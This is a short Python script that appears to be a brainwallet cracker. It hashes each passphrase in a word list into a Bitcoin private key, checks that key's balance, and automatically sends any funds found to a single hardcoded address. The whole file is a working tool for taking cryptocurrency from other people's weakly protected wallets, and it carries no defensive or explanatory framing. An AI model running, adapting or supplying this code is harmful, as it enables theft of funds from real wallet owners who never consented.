import hashlib
import codecs
import chardet
from bitcoin import privkey_to_pubkey, pubkey_to_address
from bit import Key
from bit.exceptions import InsufficientFunds
import base58

# Address to sweep funds to
sweep_address = "3FxQzNxA1MYEjmtQjEYfKisLPYq1b7hBCf"

def sha256(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()

def get_private_key_from_passphrase(passphrase):
    private_key = sha256(passphrase)
    return private_key

def private_key_to_wif(private_key):
    extended_key = "80" + private_key
    first_sha256 = sha256(codecs.decode(extended_key, 'hex_codec'))
    second_sha256 = sha256(codecs.decode(first_sha256, 'hex_codec'))
    checksum = second_sha256[:8]
    final_key = extended_key + checksum
    wif = base58.b58encode(codecs.decode(final_key, 'hex_codec')).decode('utf-8')
    return wif

def detect_encoding(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read()
    result = chardet.detect(raw_data)
    return result['encoding']

def sweep_funds(private_key_wif):
    try:
        key = Key(private_key_wif)
        balance = key.get_balance('btc')
        balance = float(balance)

        if balance > 0:
            print(f"Balance for address {key.address} is {balance} BTC. Sweeping funds.")
            try:
                tx_hash = key.send([(sweep_address, balance, 'btc')], fee='fastest')
                print(f"Transaction sent: {tx_hash}")
            except InsufficientFunds as e:
                print(f"Insufficient funds to send transaction: {e}")
        else:
            print(f"Insufficient balance for address: {key.address}")
    except Exception as e:
        print(f"Error handling key {private_key_wif}: {e}")

def main():
    file_path = 'brainwallets.txt'
    encoding = detect_encoding(file_path)
    with open(file_path, 'r', encoding=encoding) as f:
        passphrases = f.readlines()

    for passphrase in passphrases:
        passphrase = passphrase.strip()
        private_key = get_private_key_from_passphrase(passphrase)
        wif = private_key_to_wif(private_key)
        print(f"Sweeping funds from WIF: {wif}")
        sweep_funds(wif)

if __name__ == "__main__":
    main()
